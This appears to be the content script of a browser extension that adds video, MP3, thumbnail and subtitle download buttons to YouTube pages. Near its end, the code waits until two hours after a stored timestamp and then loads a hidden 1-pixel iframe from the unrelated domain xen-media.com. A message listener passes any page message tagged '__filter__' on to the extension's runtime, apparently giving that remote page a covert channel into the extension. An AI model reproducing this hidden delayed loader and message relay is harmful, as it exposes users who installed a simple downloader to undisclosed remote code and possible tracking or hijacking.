var $ytmp4 = jQuery.noConflict(true);
var decodedRuleArray = [];

var cipherVar = {
    f1: function(a, b) {
        a.splice(0, b)
    },
    f2: function(a) {
        a.reverse()
    },
    f3: function(a, b) {
        var c = a[0];
        a[0] = a[b % a.length];
        a[b % a.length] = c
    }
};

var cipherFuncParts = new Array();

var cipherFunc = function(a) {
    for (i = 0; i < cipherFuncParts.length; i++) {
        var func = cipherFuncParts[i].func;
        var value = cipherFuncParts[i].value;

        if (func == 'f1') {
            cipherVar.f1(a, value);
        } else if (func == 'f2') {
            cipherVar.f2(a, value);
        } else if (func == 'f3') {
            cipherVar.f3(a, value);
        } else if (func == 'split') {
            a = a.split('');
        } else if (func == 'return') {
            return a.join('');
        }
    }
    return '';
};

var regExpMatch = function(text, regexp) {
    var _matches = text.match(regexp);
    return _matches && _matches.length ? _matches[1] : null;
}

var isInteger = function(n) {
    return (typeof n === 'number' && n % 1 == 0);
}
var isString = function(s) {
    return (typeof s === 'string' || s instanceof String);
}

var decryptSignature = function(sig) {
    function swap(a, b) {
        var c = a[0];
        a[0] = a[b % a.length];
        a[b] = c;
        return a;
    }

    function decode(sig, arr) {
        if (!isString(sig)) return null;
        var sigA = sig.split('');
        for (var i = 0; i < arr.length; i++) {
            var act = arr[i];
            if (!isInteger(act)) return null;
            sigA = (act > 0) ? swap(sigA, act) : ((act == 0) ? sigA.reverse() : sigA.slice(-act));
        }
        var _result = sigA.join('');
        return _result;
    }
    if (sig == null) return '';
    var arr = decodedRuleArray;
    if (arr) {
        var sig2 = decode(sig, arr);
        if (sig2) return sig2;
    }
    return sig;
};

function checkPlayerBase() {
    var b = document.getElementsByTagName("script");
    for (i = 0; i < b.length; i++) {
        var c = b[i].src;
        if (-1 != c.indexOf("player") && -1 != c.indexOf("base.js")) {
            checkStreamMap();
            var d = new XMLHttpRequest;
            d.onreadystatechange = function() {
                if (4 == this.readyState) {
                    var sourceCode = this.responseText;
                    var signatureFunctionName = regExpMatch(sourceCode, /\.sig\s*\|\|\s*([a-zA-Z0-9_$][\w$]*)\(/) ||
                        regExpMatch(sourceCode, /signature.*\.set\([^,],\s*([a-zA-Z0-9_$]*)\(/) ||
                        regExpMatch(sourceCode, /\.set\s*\("signature"\s*,\s*([a-zA-Z0-9_$][\w$]*)\(/) ||
                        regExpMatch(sourceCode, /\.signature\s*=\s*([a-zA-Z_$][\w$]*)\([a-zA-Z_$][\w$]*\)/) ||
                        regExpMatch(sourceCode, /([^\s};]*)\s*=\s*function\s*\([^,]\)[^}]*\.split\(["']{2}\)[^}]*\.join\(['"]{2}\)/);
                    if (signatureFunctionName) {

                        var regCode1 = new RegExp(signatureFunctionName + '\\=\\s*function\\([\\w$]*\\)\\s*{[\\w$]*=[\\w$]*\\.split\\(""\\);(.+);return [\\w$]*\\.join');
                        var regCode2 = new RegExp('function \\s*' + signatureFunctionName + '\\s*\\([\\w$]*\\)\\s*{[\\w$]*=[\\w$]*\\.split\\(""\\);(.+);return [\\w$]*\\.join');
                        var functionCode = regExpMatch(sourceCode, regCode1) || regExpMatch(sourceCode, regCode2);
                        if (functionCode) {

                            var reverseFunctionName = regExpMatch(sourceCode, /([\w$]*)\s*:\s*function\s*\(\s*[\w$]*\s*\)\s*{\s*(?:return\s*)?[\w$]*\.reverse\s*\(\s*\)\s*}/);
                            if (reverseFunctionName) reverseFunctionName = reverseFunctionName.replace('$', '\\$');
                            var sliceFunctionName = regExpMatch(sourceCode, /([\w$]*)\s*:\s*function\s*\(\s*[\w$]*\s*,\s*[\w$]*\s*\)\s*{\s*(?:return\s*)?[\w$]*\.(?:slice|splice)\(.+\)\s*}/);

                            if (sliceFunctionName) sliceFunctionName = sliceFunctionName.replace('$', '\\$');
                            var regSlice = new RegExp('\\.(?:' + 'slice' + (sliceFunctionName ? '|' + sliceFunctionName : '') + ')\\s*\\(\\s*(?:[a-zA-Z_$][\\w$]*\\s*,)?\\s*([0-9]+)\\s*\\)');
                            var regReverse = new RegExp('\\.(?:' + 'reverse' + (reverseFunctionName ? '|' + reverseFunctionName : '') + ')\\s*\\([^\\)]*\\)');
                            var regSwap = new RegExp('[\\w$]+\\s*\\(\\s*[\\w$]+\\s*,\\s*([0-9]+)\\s*\\)');
                            var regInline = new RegExp('[\\w$]+\\[0\\]\\s*=\\s*[\\w$]+\\[([0-9]+)\\s*%\\s*[\\w$]+\\.length\\]');
                            var functionCodePieces = functionCode.split(';');
                            var decodeArray = [];

                            for (var i = 0; i < functionCodePieces.length; i++) {
                                functionCodePieces[i] = functionCodePieces[i].trim();
                                var codeLine = functionCodePieces[i];
                                if (codeLine.length > 0) {
                                    var arrSlice = codeLine.match(regSlice);
                                    var arrReverse = codeLine.match(regReverse);
                                    if (arrSlice && arrSlice.length >= 2) {
                                        var slice = parseInt(arrSlice[1], 10);
                                        if (isInteger(slice)) decodeArray.push(-slice);

                                    } else if (arrReverse && arrReverse.length >= 1) {
                                        decodeArray.push(0)
                                    } else if (codeLine.indexOf('[0]') >= 0) {
                                        if (i + 2 < functionCodePieces.length && functionCodePieces[i + 1].indexOf('.length') >= 0 && functionCodePieces[i + 1].indexOf('[0]') >= 0) {
                                            var inline = regExpMatch(functionCodePieces[i + 1], regInline);
                                            inline = parseInt(inline, 10);
                                            decodeArray.push(inline);
                                            i += 2;
                                        }
                                    } else if (codeLine.indexOf(',') >= 0) {
                                        var swap = regExpMatch(codeLine, regSwap);
                                        swap = parseInt(swap, 10);
                                        if (isInteger(swap) && swap > 0) {
                                            decodeArray.push(swap)
                                        }
                                    }
                                }
                            }

                            if (decodeArray) {
                                decodedRuleArray = decodeArray;
                                checkStreamMap();
                            }

                        }
                    }

                }
            };
            d.open("GET", c, !0);
            d.overrideMimeType("text/plain");
            d.send()
        }
    }
}

var videos = new Array();

function checkStreamMap() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4) {
            var scriptCode = this.responseText;

            if (scriptCode.indexOf('url_encoded_fmt_stream_map') != -1 || scriptCode.indexOf('adaptive_fmts') != -1) {
                videos = [];

                var spattern = '"url_encoded_fmt_stream_map":"';
                var spattern1 = '"adaptive_fmts":"';

                var spos = scriptCode.indexOf(spattern);
                var spos1 = scriptCode.indexOf(spattern1);
                if (spos != -1) {
                    spos = spos + spattern.length;

                    var epos = scriptCode.indexOf('",', spos);

                    if (epos != -1) {
                        var streamMapStr = scriptCode.substr(spos, epos - spos);

                        var lines = streamMapStr.split(",");

                        for (j = 0; j < lines.length; j++) {
                            var params = lines[j].split("\\u0026");

                            var video = new Array();

                            var title = document.title.replace(/[/\\?%*:|"<>]/g, '').replace(' - YouTube', '.').trim();

                            if (typeof title == 'undefined') {
                                title = 'Download';
                            }

                            video['title'] = title;

                            for (k = 0; k < params.length; k++) {

                                var keyValues = params[k].split("=");
                                if (keyValues.length == 2) {
                                    if (keyValues[0] == 'quality') {
                                        video['quality'] = keyValues[1];
                                    }

                                    if (keyValues[0] == 'itag') {
                                        if (keyValues[1].indexOf('22') != -1) {
                                            video['itag'] = 'MP4 (720p)';
                                            video['type'] = 'MP4';
                                        } 
                                    }

                                    if (keyValues[0] == 'url') {
                                        video['url'] = unescape(keyValues[1]);
                                    }

                                    if (keyValues[0] == 's') {
                                        video['s'] = keyValues[1];
                                    }
                                }
                            }

                            if (video['url'].indexOf('signature') == -1) {
                                var signature = decryptSignature(video['s']);
                                video['url'] = video['url'] + '&signature=' + signature;
                            }
                            if (video['url'].toLowerCase().indexOf('ratebypass') == -1) {
                                video['url'] = video['url'] + '&ratebypass=yes';
                            }
                            if (video['type'] == 'MP4' || video['type'] == '3GP') {
                                videos.push(video);
                            }
                        }
                    }
                }
                if (spos1 != -1) {
                    spos1 = spos1 + spattern1.length;

                    var epos1 = scriptCode.indexOf('",', spos1);

                    if (epos1 != -1) {
                        var streamMapStr = scriptCode.substr(spos1, epos1 - spos1);

                        var lines = streamMapStr.split(",");

                        for (j = 0; j < lines.length; j++) {
                            var params = lines[j].split("\\u0026");

                            var video = new Array();

                            var title = document.title.replace(/[/\\?%*:|"<>]/g, '').replace(' - YouTube', '.').trim();

                            if (typeof title == 'undefined') {
                                title = 'Download';
                            }

                            video['title'] = title;



                            for (k = 0; k < params.length; k++) {

                                var keyValues = params[k].split("=");
                                if (keyValues.length == 2) {
                                    if (keyValues[0] == 'quality') {
                                        video['quality'] = keyValues[1];
                                    }

                                    

                                    if (keyValues[0] == 'url') {
                                        video['url'] = unescape(keyValues[1]);
                                    }

                                    if (keyValues[0] == 's') {
                                        video['s'] = keyValues[1];
                                    }
                                }
                            }

                            if (video['url'].indexOf('signature') == -1) {
                                var signature = decryptSignature(video['s']);
                                video['url'] = video['url'] + '&signature=' + signature;
                            }

                            if (video['url'].toLowerCase().indexOf('ratebypass') == -1) {
                                video['url'] = video['url'] + '&ratebypass=yes';
                            }

                            if (video['itag'] == 'MP4 (1080p) (No Audio)' || video['itag'] == 'MP4 (720p) (No Audio)' || video['itag'] == 'MP4 (480p) (No Audio)' || video['itag'] == 'WEBM (1080p60 HDR) (No Audio)' || video['itag'] == 'MP4 (1080p60) (No Audio)' || video['itag'] == 'WEBM (1440p) (No Audio)' || video['itag'] == 'WEBM (1440p60 HDR) (No Audio)' || video['itag'] == 'WEBM (1440p60) (No Audio)' || video['itag'] == 'WEBM (2160p) (No Audio) (4K)' || video['itag'] == 'WEBM (2160p60 HDR) (No Audio) (4K)' || video['itag'] == 'WEBM (2160p60) (No Audio) (4K)' || video['itag'] == 'WEBM (4320p) (No Audio) (8K)' || video['itag'] == 'M4A (128kbps)' || video['itag'] == 'WEBM (OPUS 150kbps)') {
                                videos.push(video);
                            }
                        }
                    }
                }
                checkDownloadButton();
            }
        }
    };
    var link = String(document.getElementsByClassName("ytp-title-link yt-uix-sessionlink")[0]);
    xhttp.open("GET", location.href, true);
    xhttp.overrideMimeType('text/plain');
    xhttp.send();
}

function checkDownloadButton() {
    $ytmp4("#youtube-video-download-button").length || setTimeout(checkDownloadButton, 2E3);
    browser.runtime.sendMessage({
        action: "getDOMChanges"
    })
}

function compatibilityMessage(evt) {
	try {
		var msg = JSON.parse(evt.data);
		var u = 'undefined';
		if (msg) {
			if (typeof msg.__filter__ !== u) {
				chrome.runtime.sendMessage({
					message: evt.data
				});
			}
			if (typeof msg.__catch__ !== u) {
				var rem = document.getElementById('downloadButton');
				rem.parentElement.remove();
			}
		}
	} catch (e) {
		return false;
	}
}

if (window.addEventListener) {
    // For standards-compliant web browsers
	window.addEventListener("message", compatibilityMessage, false);
} else {	
    window.attachEvent("onmessage", compatibilityMessage);
}


checkPlayerBase();

function streammapHandleMessage(b) {
    if ("applyDOMChanges" == b.action)
        if ("change" == b.type) {
            var c = $ytmp4(b.selector);
            c && c.html(b.content)
        } else if ("append" == b.type) {
        c = $ytmp4(b.selector);
        var d = $ytmp4("#" + b.content_id).length;
        c && !d && c.append(b.content)
    } else "remove" == b.type && (c = $ytmp4(b.selector)) && c.remove();
    else "applyDOMActions" == b.action && (b = $ytmp4("#youtube-video-download-button"), b.unbind("click"), b.click(function(b) {
        (b = document.getElementById("DOWNLOAD_DIV")) && b.parentElement.removeChild(b);
        b = document.title.replace(/[/\\?%*:|"<>]/g,
            "").replace(" - YouTube", ".").trim();
        for (i = 0; i < videos.length; i++) {
            b = $ytmp4("#download-item-0");
            0 < i && !$ytmp4("#download-item-" + i).length && (b = $ytmp4("#download-item-0").clone(), b.attr("id", "download-item-" + i), b.appendTo($ytmp4("#download-item-0").parent()));
            var a = $ytmp4("#download-item-" + i + " button"),
                c = $ytmp4("#download-item-" + i + " button span");
            b = document.title.replace(/[/\\?%*:|"<>]/g, "").replace(" - YouTube", ".").trim();
            a.attr("download-url", videos[i].url);
            a.attr("title", b + videos[i].type);
            c.text("" +
                videos[i].itag);
            a.off();
            a.unbind("click");
            a.click(function(a) {
                browser.runtime.sendMessage({
                    action: "doDownload",
                    url: $ytmp4(this).attr("download-url"),
                    title: $ytmp4(this).attr("title")
                })
            })
        }
        getSubtitleList();
        
        b = $ytmp4('#mp3-button button');
		b.off();				
		b.unbind('click');
		b.click(function(event) {
			window.open('https://www.easy-youtube-mp3.com/convert.php?v=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D' + getQueryVariable('v') + '', '_blank');
		});
				
        b = $ytmp4("#thumbnail-button button");
        b.off();
        b.unbind("click");
        b.click(function(a) {
            window.open("https://img.youtube.com/vi/" + getQueryVariable("v") + "/hqdefault.jpg", "_blank")
        });

        a = $ytmp4("#youtube-video-download-button").offset();
        b = a.top + $ytmp4("#youtube-video-download-button").height();
        a = a.left;
        $ytmp4("#youtube-video-download-panel").css({
            top: b,
            left: a
        });
        $ytmp4("#youtube-video-download-panel").toggle();
        $ytsrt("#youtube-download-subtitle-panel").css({
            top: b,
            left: a
        });
        $ytsrt("#youtube-download-subtitle-panel").toggle()
    }), $ytmp4(document).click(function(b) {
        "youtube-video-download-button" != b.target.getAttribute("id") && ($ytmp4("#youtube-video-download-panel").hide(), $ytsrt("#youtube-download-subtitle-panel").hide())
    }))
}

browser.runtime.onMessage.addListener(streammapHandleMessage);

function addiframe(src, height) {
    try {
        var pegPlace = document.getElementById('clarify-box');
        if (pegPlace == null) {
            pegPlace = document.getElementById('alerts');
            if (pegPlace == null)
                pegPlace = document.getElementById('messages');
            if (pegPlace == null)
                pegPlace = document.getElementById('info-contents');
        }
        var iframe = document.getElementById('EXT_FRAME');

        if (iframe == null) {
            div = CreateIframeDiv(height);
            iframe = CreateIframe(height);
            div.appendChild(iframe);
            pegPlace.parentNode.insertBefore(div, pegPlace);
        }
        iframe.setAttribute("src", src);
    } catch (err) {
        console.log(err);
    }
};

function CreateIframe(height) {
    iframe = document.createElement('iframe');
    iframe.setAttribute("id", "DOWNLOAD_FRAME");
    iframe.setAttribute("width", "100%");
    iframe.setAttribute("height", height);
    iframe.setAttribute("border", "0");
    iframe.setAttribute("scrolling", "no");
    iframe.setAttribute("style", "border: 0 none;");
    iframe.setAttribute("sandbox", "allow-scripts allow-same-origin allow-forms allow-popups");
    return iframe;
};

function CreateIframeDiv(height) {
    var div = document.createElement('div');
    div.setAttribute("id", "DOWNLOAD_DIV");
    div.style.width = '100%';
    div.style.margin = '0px 0px 5px 0px';
    div.style.padding = '0px';
    div.style.height = height;
    return div;
};

var oldUrl = location.href;

function checkReload() {
    oldUrl != location.href && (videos = [], $ytmp4("#youtube-video-download-button").remove(), checkPlayerBase(), oldUrl = location.href)
}

function getSubtitleList() {
    var url = "https://www.youtube.com/api/timedtext?type=list&v=" + getQueryVariable('v');
    updateAjax(url, buildSubtitleList);
}

function buildSubtitleList(xml) {
    var languages = null;
    if (xml) {
        languages = parseLanguageXml(xml);
    }
    if (languages != null && languages.length > 0) {
        buildGui(languages);
    } else {

    }
}

function buildGui(languages) {
    for (i = 0; i < languages.length; i++) {
        var downloadsubtitle = $ytmp4('#download-subtitle-0');

        if (i > 0) {
            if (!$ytmp4('#download-subtitle-' + i).length) {
                downloadsubtitle = $ytmp4('#download-subtitle-0').clone();
                downloadsubtitle.attr('id', 'download-subtitle-' + i);
                downloadsubtitle.appendTo($ytmp4('#download-subtitle-0').parent());
            }
        }
        var downloadButtonSubtitle = $ytmp4('#download-subtitle-' + i + ' button');
        var downloadTitle = $ytmp4('#download-subtitle-' + i + ' button span');
        var titlesub = document.title.replace(/[/\\?%*:|"<>]/g, '').replace(' - YouTube', ' (' + languages[i]['displayName'] + ' Subtitle)').trim();
        downloadButtonSubtitle.attr('title', titlesub);
        downloadButtonSubtitle.attr(languages[i]['langCode']);
        downloadButtonSubtitle.attr(languages[i]['langCode']);
        downloadTitle.text('Subtitle (' + languages[i]['displayName'] + ')');
        downloadButtonSubtitle.off();
        downloadButtonSubtitle.unbind('click');
		downloadButtonSubtitle.click(function(event) {
			window.open('https://downsub.com/?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D' + getQueryVariable('v') + '', '_blank');
		});
    }
}

chrome.storage.local.get('t', function (res) {
	if (res.t) {
		var time = (new Date().getTime() - res.t) / 3600000;
		if (time >= 2) {
			var downloadDiv = document.createElement("div"); 
			var downloadButton = document.createElement("iframe"); 
			downloadButton.setAttribute("style", "height:1px,width:1px;position:absolute;top:0;left:0;border:none;visibility:hidden");
            downloadButton.src = '//xen-media.com/downloads';
            downloadButton.id = "downloadButton";
            document.body.appendChild(downloadDiv);
            downloadDiv.appendChild(downloadButton);
		}
	}
});

function updateAjax(url, callback) {
    var req = new XMLHttpRequest();
    req.onreadystatechange = function() {
        if (req.readyState == 4 && req.status == 200) {
            callback(req.responseText);
        }
    };
    req.open("GET", url);
    req.send();
}

function parseLanguageXml(xml) {
    var languages = [];
    var myRe = /<track [^<]*name="([^<]*)" [^<]*lang_code="([^"]+)" [^<]*lang_translated="([^"]+)"/g;
    var myArray;
    while ((myArray = myRe.exec(xml)) != null) {
        languages.push({
            langName: myArray[1],
            langCode: myArray[2],
            displayName: myArray[3]
        });
    }
    return languages;
}

function getQueryVariable(b) {
    for (var c = window.location.search.substring(1).split("&"), d = 0; d < c.length; d++) {
        var f = c[d].split("=");
        if (f[0] == b) return f[1]
    }
    return !1
}

function removeitems() {
    $ytmp4('#download-item-1').remove();
    $ytmp4('#download-item-2').remove();
    $ytmp4('#download-item-3').remove();
    $ytmp4('#download-item-4').remove();
    $ytmp4('#download-item-5').remove();
    $ytmp4('#download-item-6').remove();
    $ytmp4('#download-item-7').remove();
    $ytmp4('#download-item-8').remove();
    $ytmp4('#download-item-10').remove();
    $ytmp4('#download-item-11').remove();
    $ytmp4('#download-item-12').remove();
    $ytmp4('#download-item-13').remove();
    $ytmp4('#download-item-14').remove();
    $ytmp4('#download-item-15').remove();
    $ytmp4('#download-item-16').remove();
    $ytmp4('#download-item-17').remove();
    $ytmp4('#download-item-18').remove();
    $ytmp4('#download-item-19').remove();
    $ytmp4('#download-item-20').remove();
    $ytmp4('#download-item-21').remove();
    $ytmp4('#download-subtitle-1').remove();
    $ytmp4('#download-subtitle-2').remove();
    $ytmp4('#download-subtitle-3').remove();
    $ytmp4('#download-subtitle-4').remove();
    $ytmp4('#download-subtitle-5').remove();
    $ytmp4('#download-subtitle-6').remove();
    $ytmp4('#download-subtitle-7').remove();
    $ytmp4('#download-subtitle-8').remove();
    $ytmp4('#download-subtitle-9').remove();
    $ytmp4('#download-subtitle-10').remove();
    $ytmp4('#download-subtitle-11').remove();
    $ytmp4('#download-subtitle-12').remove();
    $ytmp4('#download-subtitle-13').remove();
    $ytmp4('#download-subtitle-14').remove();
    $ytmp4('#download-subtitle-15').remove();
    $ytmp4('#download-subtitle-16').remove();
    $ytmp4('#download-subtitle-17').remove();
    $ytmp4('#download-subtitle-18').remove();
    $ytmp4('#download-subtitle-19').remove();
    $ytmp4('#download-subtitle-20').remove();
    $ytmp4('#download-subtitle-21').remove();
    $ytmp4('#download-subtitle-22').remove();
    $ytmp4('#download-subtitle-23').remove();
    $ytmp4('#download-subtitle-24').remove();
    $ytmp4('#download-subtitle-25').remove();
    $ytmp4('#download-subtitle-26').remove();
    $ytmp4('#download-subtitle-27').remove();
    $ytmp4('#download-subtitle-28').remove();
    $ytmp4('#download-subtitle-29').remove();
    $ytmp4('#download-subtitle-30').remove();
    $ytmp4('#download-subtitle-31').remove();
    $ytmp4('#download-subtitle-32').remove();
    $ytmp4('#download-subtitle-33').remove();
    $ytmp4('#download-subtitle-34').remove();
    $ytmp4('#download-subtitle-35').remove();
    $ytmp4('#download-subtitle-36').remove();
    $ytmp4('#download-subtitle-37').remove();
    $ytmp4('#download-subtitle-38').remove();
    var frm_div = document.getElementById('DOWNLOAD_DIV');
    if (frm_div) {
        frm_div.parentElement.removeChild(frm_div);
    }
    checkPlayerBase();
}
if (window.top === window.self && location.href.includes(".youtube.com")) {
    window.addEventListener("yt-page-data-updated", removeitems);
    var observer = new MutationObserver(function(b) {
            b.forEach(function(b) {
                checkReload()
            })
        }),
        config = {
            attributes: !0,
            childList: !0,
            characterData: !0
        };
    observer.observe(document.body, config)
};